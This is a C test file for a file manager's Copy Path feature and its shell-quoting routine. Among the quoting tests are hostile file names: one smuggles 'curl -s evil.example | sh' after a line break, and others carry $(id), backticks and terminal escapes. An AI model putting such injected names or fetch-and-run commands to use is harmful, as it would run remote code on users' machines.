// F13 (docs/plan.md "F13 design"): Copy Path. Included by test.c after test_f12.c.

// Ctrl+Shift+C: the files' paths as text, in a folder (one that can't be written too: nothing is
// written), an empty one (its own path, Michael 2026-11-04) and a search; not in the trash view.
// With the sidebar's keys, its cursor's folder (step 1 review). Edit's entry agrees, and the entry,
// empty space and folder menus have one.
static void test_copy_path(void)
{
    static const struct { isize n; UiView v; bool w; UiActionKind want; } C[] = {
        { 3, UI_VIEW_FOLDER, true, UA_COPY_PATH }, { 3, UI_VIEW_FOLDER, false, UA_COPY_PATH }, { 0, UI_VIEW_FOLDER, true, UA_COPY_PATH },
        { 3, UI_VIEW_SEARCH, false, UA_COPY_PATH }, { 3, UI_VIEW_TRASH, false, UA_NOT_IN_TRASH }, { 0, UI_VIEW_TRASH, false, UA_NOT_IN_TRASH },
    };
    for (int c = 0; c < COUNT(C); c++) {
        Ui u = menu_ui(C[c].n);
        u.view = C[c].v, u.can_write = C[c].w;
        CHECK(menu_keys(&u, 1, UK_COPY_PATH).kind == C[c].want);
        CHECK(ui_menu_enabled(&u, UM_COPY_PATH) == (C[c].want == UA_COPY_PATH));
    }
    Ui u = menu_ui(3);
    u.focus = UI_FOCUS_SIDE;
    CHECK(menu_keys(&u, 1, UK_COPY_PATH).kind == UA_NONE && !ui_menu_enabled(&u, UM_COPY_PATH));   // (no rows)
    ui_set(&u.side, 5, 0);
    u.side.sel = 2;
    UiAction a = menu_keys(&u, 1, UK_COPY_PATH);
    CHECK(a.kind == UA_COPY_PATH && a.all && a.index == 2 && u.focus == UI_FOCUS_SIDE);
    CHECK(ui_menu_enabled(&u, UM_COPY_PATH));   // (Edit's entry as the key: code-health review, 2026-11-04)
    u.view = UI_VIEW_TRASH;   // (a sidebar row is a folder elsewhere: the view doesn't matter)
    CHECK(menu_keys(&u, 1, UK_COPY_PATH).kind == UA_COPY_PATH && ui_menu_enabled(&u, UM_COPY_PATH));
    // The menus: Edit and an entry's after Copy, a folder's after its Copy; picked, Edit's runs the
    // key, the folder's goes to gui/ for its folder.
    CHECK(menu_place(1, UM_COPY_PATH) == menu_place(1, UM_COPY) + 1);
    CHECK(menu_place(UI_CTX_ENTRY, UM_COPY_PATH) == menu_place(UI_CTX_ENTRY, UM_COPY) + 1);
    CHECK(menu_place(UI_CTX_FOLDER, UM_COPY_PATH_IT) == menu_place(UI_CTX_FOLDER, UM_COPY_IT) + 1);
    CHECK(menu_place(UI_CTX_HERE, UM_COPY_PATH_HERE) == menu_place(UI_CTX_HERE, UM_PASTE) + 1);
    CHECK(menu_place(UI_CTX_HERE, UM_COPY_PATH) < 0 && menu_place(UI_CTX_FOLDER, UM_COPY_PATH) < 0);
    // The empty space's: the folder shown (-1), not in the trash view.
    u = menu_ui(0);
    u.menu_on = true, u.menu = UI_CTX_HERE;
    CHECK(ui_menu_shown(&u, UM_COPY_PATH_HERE) && ui_menu_enabled(&u, UM_COPY_PATH_HERE));
    UiInput hin = ui_input_none();
    hin.menu_item = menu_place(UI_CTX_HERE, UM_COPY_PATH_HERE);
    a = ui_handle(&u, (UiNames){ name_at, NULL, NULL }, &hin);
    CHECK(a.kind == UA_COPY_PATH && a.all && a.index == UI_COPY_SHOWN && !u.menu_on);
    u.view = UI_VIEW_SEARCH;
    CHECK(ui_menu_shown(&u, UM_COPY_PATH_HERE));
    u.view = UI_VIEW_TRASH;
    CHECK(!ui_menu_shown(&u, UM_COPY_PATH_HERE) && !ui_menu_enabled(&u, UM_COPY_PATH_HERE));
    u = menu_ui(0);
    u.menu_on = true, u.menu = 1;
    UiInput in = ui_input_none();
    in.menu_item = menu_place(1, UM_COPY_PATH);
    CHECK(ui_handle(&u, (UiNames){ name_at, NULL, NULL }, &in).kind == UA_COPY_PATH && !u.menu_on);
    // A folder's menu: a place's too (a bookmark, a drive: they have no Cut or Copy), not the
    // trash's, nor a drive not mounted yet.
    u = menu_ui(3);
    u.menu_on = true, u.menu = UI_CTX_FOLDER, u.ctx_bmk = -1;
    CHECK(ui_menu_shown(&u, UM_COPY_PATH_IT) && ui_menu_enabled(&u, UM_COPY_PATH_IT) && !ui_menu_shown(&u, UM_COPY_PATH));
    u.ctx_place = true;
    CHECK(ui_menu_shown(&u, UM_COPY_PATH_IT) && !ui_menu_shown(&u, UM_COPY_IT));
    in = ui_input_none(), in.menu_item = menu_place(UI_CTX_FOLDER, UM_COPY_PATH_IT);
    a = ui_handle(&u, (UiNames){ name_at, NULL, NULL }, &in);
    CHECK(a.kind == UA_FOLDER_DO && a.index == UM_COPY_PATH_IT);
    u.menu_on = true, u.ctx_trash = true;
    CHECK(!ui_menu_shown(&u, UM_COPY_PATH_IT));
    u.ctx_trash = false, u.ctx_unmounted = true;
    CHECK(!ui_menu_shown(&u, UM_COPY_PATH_IT));
}

// What bash makes of shell text t (`printf %s <t>`), into out: Copy Path's text read back as a
// shell reads a paste. -1 when bash didn't run.
static isize bash_reads(const char *t, char *out, isize cap)
{
    char cmd[4096];
    snprintf(cmd, sizeof cmd, "printf %%s %s", t);
    int p[2];
    if (pipe(p) != 0) return -1;
    pid_t pid = fork();
    if (pid == 0) {
        dup2(p[1], 1), close(p[0]), close(p[1]);
        execl("/usr/bin/bash", "bash", "--norc", "--noprofile", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    close(p[1]);
    isize n = 0;
    ssize_t k;
    while (n < cap && (k = read(p[0], out + n, (size_t)(cap - n))) > 0) n += k;
    close(p[0]);
    int st;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) && WEXITSTATUS(st) == 0 ? n : -1;
}

// shell_quote (step 1 review, Michael 2026-11-04: quoted only when needed): a safe path as it is,
// else single quotes, else $'…' for a control character; each read back by bash as the same bytes,
// a line break, a quote, $( ), backticks, an escape and a C1 CSI included.
static void test_shell_quote(void)
{
    static const struct { const char *in, *want; } C[] = {
        { "/home/m/report-2.pdf", "/home/m/report-2.pdf" },
        { "/home/m/caf\xC3\xA9_a+b,c:d@e%f=g", "/home/m/caf\xC3\xA9_a+b,c:d@e%f=g" },
        { "/home/m/my file.txt", "'/home/m/my file.txt'" },
        { "/home/m/it's", "'/home/m/it'\\''s'" },
        { "/home/m/x\ncurl -s evil.example | sh\n.pdf", "$'/home/m/x\\ncurl -s evil.example | sh\\n.pdf'" },
        { "/a/\x1b]0;t\x07n", "$'/a/\\x1b]0;t\\x07n'" },
        { "/a/\xC2\x9B" "31m", "$'/a/\\xc2\\x9b31m'" },
        { "/a/\xC2\xA9\xC2\x80", "$'/a/\xC2\xA9\\xc2\\x80'" },   // (U+00A9 is a letter's kind; U+0080 is C1)
        { "/a/\x7f", "$'/a/\\x7f'" },
        { "/a/\xC2\xA9", "/a/\xC2\xA9" },
        // UTF-8 kept whole; a byte of none as \xHH (step 1 re-review): a lone 8-bit CSI, a cut
        // sequence, an overlong /, a surrogate, past U+10FFFF
        { "/a/\xE2\x82\xAC\xF0\x9F\x98\x80", "/a/\xE2\x82\xAC\xF0\x9F\x98\x80" },
        { "/a/\x9B" "31m", "$'/a/\\x9b31m'" },
        { "/a/\xE2\x82", "$'/a/\\xe2\\x82'" },
        { "/a/\xC0\xAF", "$'/a/\\xc0\\xaf'" },
        { "/a/\xED\xA0\x80", "$'/a/\\xed\\xa0\\x80'" },
        { "/a/\xF4\x90\x80\x80", "$'/a/\\xf4\\x90\\x80\\x80'" },
        { "/a/\xE0\x9F\x80 \xE0\xA0\x80", "$'/a/\\xe0\\x9f\\x80 \xE0\xA0\x80'" },
        { "/a/\xF0\x8F\xBF\xBF\xF4\x8F\xBF\xBF", "$'/a/\\xf0\\x8f\\xbf\\xbf\xF4\x8F\xBF\xBF'" },
        { "/a/b\xE2\x28\xA1", "$'/a/b\\xe2(\\xa1'" },
        // the invisible (F13 code-health review, 2026-11-04): a right-to-left override, a zero-width
        // space, a line separator, a byte-order mark, one past the set (U+2070, superscript zero: kept)
        { "/a/x\xE2\x80\xAEtxt.exe", "$'/a/x\\xe2\\x80\\xaetxt.exe'" },
        { "/a/x\xE2\x80\x8By", "$'/a/x\\xe2\\x80\\x8by'" },
        { "/a/x\xE2\x80\xA8y", "$'/a/x\\xe2\\x80\\xa8y'" },
        { "/a/\xEF\xBB\xBFx", "$'/a/\\xef\\xbb\\xbfx'" },
        { "/a/\xD8\x9Cx", "$'/a/\\xd8\\x9cx'" },
        { "/a/\xE2\x81\xA9x", "$'/a/\\xe2\\x81\\xa9x'" },
        { "/a/\xE2\x81\xB0x\xE2\x80\x8A", "/a/\xE2\x81\xB0x\xE2\x80\x8A" },
        { "/a/\xE2\x82\x28", "$'/a/\\xe2\\x82('" },
        { "/a/\xEF\xBF\xBD", "/a/\xEF\xBF\xBD" },   // (a real U+FFFD is a character: kept)
        { "/a/\xF5\x80\x80\x80", "$'/a/\\xf5\\x80\\x80\\x80'" },
        { "/a/it's\tb\\c", "$'/a/it\\'s\\tb\\\\c'" },
        { "/a/$(id)`id`\"!~#*?[]{}<>|&;^", NULL },
        { "", "''" },
    };
    for (int i = 0; i < COUNT(C); i++) {
        char q[512], back[512];
        isize n = shell_quote(str_from_c(C[i].in), q, sizeof q);
        CHECK(n > 0 && n == (isize)strlen(q));
        if (C[i].want) CHECK(strcmp(q, C[i].want) == 0);
        if (C[i].want && strcmp(q, C[i].want) != 0) fprintf(stderr, "shell_quote %d: %s\n", i, q);
        CHECK(!strchr(q, '\n') && !strchr(q, 0x1b));   // (one line, no escape byte)
        isize b = bash_reads(q, back, sizeof back);
        CHECK(b == (isize)strlen(C[i].in) && memcmp(back, C[i].in, (size_t)b) == 0);
    }
    char small[8];
    CHECK(shell_quote(S("/home/m/a"), small, sizeof small) == -1 && shell_quote(S("/a b"), small, 6) == -1);
    CHECK(shell_quote(S("/a b"), small, 7) == 6 && strcmp(small, "'/a b'") == 0);
}

// The sidebar's width (F13 step 2): the one asked for, 140 at least (0 or less too: a drag past the
// window's edge), half the window or 480 at most; a window too narrow for both keeps 140.
static void test_side_fit(void)
{
    static const struct { int want, w, got; } C[] = {
        { 0, 936, 140 }, { -5, 936, 140 }, { 200, 936, 200 }, { 260, 936, 260 }, { 9999, 936, 468 }, { 469, 936, 468 }, { 468, 936, 468 },
        { 100, 936, 140 }, { 139, 936, 140 }, { 140, 936, 140 }, { 600, 2000, 480 }, { 481, 2000, 480 }, { 300, 400, 200 }, { 300, 200, 140 },
    };
    for (int i = 0; i < COUNT(C); i++) {
        if (ui_side_fit(C[i].want, C[i].w) != C[i].got) fprintf(stderr, "side_fit %d %d: %d\n", C[i].want, C[i].w, ui_side_fit(C[i].want, C[i].w));
        CHECK(ui_side_fit(C[i].want, C[i].w) == C[i].got);
    }
}

// sidewidth= in the state file: 1 to 4 digits, else none (0).
static void test_state_sidewidth(void)
{
    static const struct { const char *line; int px; } C[] = {
        { "sidewidth=260\n", 260 }, { "sidewidth = 9999\n", 9999 }, { "sidewidth=7", 7 }, { "sidewidth=12345\n", 0 }, { "sidewidth=abc\n", 0 },
        { "sidewidth=26a\n", 0 }, { "sidewidth=\n", 0 }, { "sidewidth=-3\n", 0 }, { "sidebar=tree\n", 0 },
    };
    char path[PATH_MAX];
    snprintf(path, sizeof path, "%s", at("f13-state"));
    for (int i = 0; i < COUNT(C); i++) {
        put(path, C[i].line);
        State s = state_load(&ta, path);
        CHECK(s.side_px == C[i].px);
    }
}

// A drag starts 6 px from the press, any way; Nemo's rule for what a drop does (F13 step 3).
static void test_drag_rule(void)
{
    CHECK(!ui_drag_past(0, 0) && !ui_drag_past(5, 0) && !ui_drag_past(0, -5) && !ui_drag_past(4, 4));
    CHECK(ui_drag_past(6, 0) && ui_drag_past(0, -6) && ui_drag_past(-5, 4) && ui_drag_past(4.3f, 4.3f));
    CHECK(ui_drop_op(true, 0) == UI_DROP_MOVE && ui_drop_op(false, 0) == UI_DROP_COPY);
    CHECK(ui_drop_op(true, UI_MOD_CTRL) == UI_DROP_COPY && ui_drop_op(false, UI_MOD_SHIFT) == UI_DROP_MOVE);
    CHECK(ui_drop_op(false, UI_MOD_CTRL | UI_MOD_SHIFT) == UI_DROP_COPY);   // (both: Ctrl's, as Nemo; its link is not ofx's)
}

// The menus' rules as a switch (F13 code-health review): Rename is in Edit with several marked
// (greyed by its key's rule), off a right-click menu then.
static void test_menu_shown_switch(void)
{
    Ui u = menu_ui(3);
    u.marked = 2, u.menu = 1;   // (the rule reads the count)
    CHECK(ui_menu_shown(&u, UM_RENAME));
    u.menu = UI_CTX_ENTRY;
    CHECK(!ui_menu_shown(&u, UM_RENAME));
}
